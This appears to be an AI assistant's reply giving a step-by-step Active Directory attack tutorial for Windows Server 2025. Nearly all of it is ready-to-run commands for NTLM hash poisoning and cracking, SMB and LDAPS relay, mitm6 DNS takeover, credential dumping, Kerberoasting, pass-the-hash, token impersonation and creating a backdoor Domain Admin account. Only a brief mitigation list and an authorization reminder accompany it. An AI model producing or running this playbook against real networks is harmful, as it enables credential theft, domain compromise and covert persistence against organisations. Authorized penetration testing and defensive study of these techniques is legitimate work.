Here's your revised tutorial with placeholder IP addresses (like `ip_host`, `ip_client`, `ip_victim`) and additional descriptions for better understanding:

---

# **Windows Server 2025 Active Directory Penetration Testing Guide**

This tutorial covers common attack vectors against **Active Directory (AD)** in a lab environment. Replace the placeholder IPs (`ip_host`, `ip_client`, `ip_victim`, etc.) with your actual target addresses.

---

## **Phase 1: Initial Enumeration & Attacks**
### **1. LLMNR/NBT-NS Poisoning (Capturing NTLM Hashes)**
**Objective**: Exploit weak name resolution protocols to capture NTLMv2 hashes.  
**Tools**: `Responder`  

```bash
sudo responder -I eth0 -dwPv
```
- **Expected Output**:  
  - Captured hash format:  
    ```
    USERNAME::DOMAIN:HASH_PART:NT_HASH...
    ```
- **Cracking the Hash with Hashcat**:
  ```bash
  hashcat -m 5600 captured_hashes.txt /usr/share/wordlists/rockyou.txt --force
  ```

---

### **2. SMB Relay Attack (NTLM Relay)**
**Objective**: Relay captured hashes to gain unauthorized access.  

#### **Step 1: Identify Vulnerable Hosts**
```bash
sudo nmap --script=smb2-security-mode.nse -p445 ip_client1,ip_client2 -Pn
```
- **Look for**: `Message signing: disabled`  

#### **Step 2: Prepare Targets File**
```bash
echo "ip_client1" > targets.txt  
echo "ip_client2" >> targets.txt  
```

#### **Step 3: Launch NTLM Relay**
```bash
impacket-ntlmrelayx -tf targets.txt -smb2support -i
```
- **Interactive Shell Access**:
  ```bash
  nc 127.0.0.1 11000
  ```
  - Use commands like `shares`, `use C$`, and `ls` to navigate.

---

### **3. IPv6 DNS Takeover (mitm6 + NTLM Relay)**
**Objective**: Exploit IPv6 DNS to intercept credentials.  

1. **Run mitm6** (DNS spoofing):
   ```bash
   mitm6 -d domain.local -i eth0
   ```
2. **Relay to LDAPS**:
   ```bash
   impacket-ntlmrelayx -6 -t ldaps://ip_dc -wh fakewpad.domain.local -l lootme
   ```

---

## **Phase 2: Post-Exploitation & Privilege Escalation**
### **1. Dumping AD Credentials (Secretsdump)**
```bash
impacket-secretsdump domain/user:password@ip_dc
```
- **Extracts**:  
  - NTLM hashes  
  - Kerberos tickets  
  - Cached credentials  

---

### **2. Kerberoasting (Cracking Service Account Hashes)**
```bash
impacket-GetUserSPNs domain.local/user:password -dc-ip ip_dc -request -outputfile kerberoast_hashes.txt
```
- **Crack with Hashcat**:
  ```bash
  hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
  ```

---

### **3. Pass-the-Hash (Lateral Movement)**
```bash
crackmapexec smb ip_client1 -u administrator -H NTLM_HASH --local-auth
```
- **Alternative (Meterpreter)**:
  ```bash
  msf6 > use exploit/windows/smb/psexec
  msf6 > set SMBUser Administrator
  msf6 > set SMBPass NTLM_HASH
  msf6 > set RHOSTS ip_client1
  msf6 > run
  ```

---

### **4. Token Impersonation (Becoming Domain Admin)**
1. **List Available Tokens**:
   ```bash
   meterpreter > load incognito  
   meterpreter > list_tokens -u  
   ```
2. **Impersonate Administrator**:
   ```bash
   meterpreter > impersonate_token DOMAIN\\Administrator
   ```
3. **Verify Access**:
   ```bash
   meterpreter > shell
   whoami
   ```

---

### **5. Persistence (Creating Backdoor User)**
```bash
net user /add backdooruser P@ssw0rd123! /domain  
net group "Domain Admins" backdooruser /ADD /DOMAIN  
```

---

## **Mitigation & Defense**
✅ **Enable SMB Signing** (Prevents relay attacks)  
✅ **Disable LLMNR/NBT-NS** (Prevents poisoning)  
✅ **Enforce Strong Password Policies** (Prevents cracking)  
✅ **Monitor LDAP/Kerberos Logs** (Detects relay & brute-force)  

---

## **Conclusion**
This guide demonstrates common AD attack techniques. Always perform penetration testing **ethically** and with proper authorization.  